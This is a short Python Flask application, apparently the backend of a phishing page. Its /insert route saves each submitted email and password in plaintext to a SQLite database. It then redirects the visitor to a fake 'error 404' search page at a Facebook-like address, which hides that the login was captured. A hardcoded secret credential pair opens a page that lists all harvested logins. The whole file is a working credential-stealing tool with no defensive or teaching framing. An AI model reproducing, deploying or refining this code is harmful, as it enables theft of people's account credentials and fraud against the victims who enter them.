from flask import Flask,render_template,request,redirect
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

app.config ['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite3'

db=SQLAlchemy(app)

class abc(db.Model):
    sno=db.Column(db.Integer, primary_key=True)
    uname=db.Column(db.String(100))
    code=db.Column(db.String(100))
    
@app.route('/')
def home():
    return render_template("index.html")
    
@app.route('/insert',methods=['GET','POST'])
def insert():
    url="https://tse4.mm.bing.net/th?id=OIP.aBhALad4txuWlHF3z4r0HwHaHa&pid=Api&P=0&w=300&h=300"
    email=request.form['email']
    pas=request.form['pass']
    if not((email=='137727f94fc7a59db86b5d51e833cc5f674c0e5a' and pas=='137727f94fc7a59db86b5d51e833cc5f674c0e5a')):
        k=abc(uname=email,code=pas)
        db.session.add(k)
        db.session.commit()
    else:
       g = abc.query.all()
       return render_template('tinku.html',result=g)
    url = "https://in.search.facebook.com/search;_ylt=AwrwSYqeae1gVHUAQgC7HAx.;_ylc=X1MDMjExNDcyMzAwMwRfcgMyBGZyA21jYWZlZQRncHJpZAMEbl9yc2x0AzAEbl9zdWdnAzAEb3JpZ2luA2luLnNlYXJjaC55YWhvby5jb20EcG9zAzAEcHFzdHIDBHBxc3RybAMwBHFzdHJsAzkEcXVlcnkDZXJyb3IlMjA0MDQEdF9zdG1wAzE2MjYxNzE4MTk-?p=error+404&fr2=sb-top&fr=mcafee&vm=r&type=E211IN826G91370"
    return redirect(url)

    
if __name__ == '__main__':
    db.create_all()
    app.run()
    
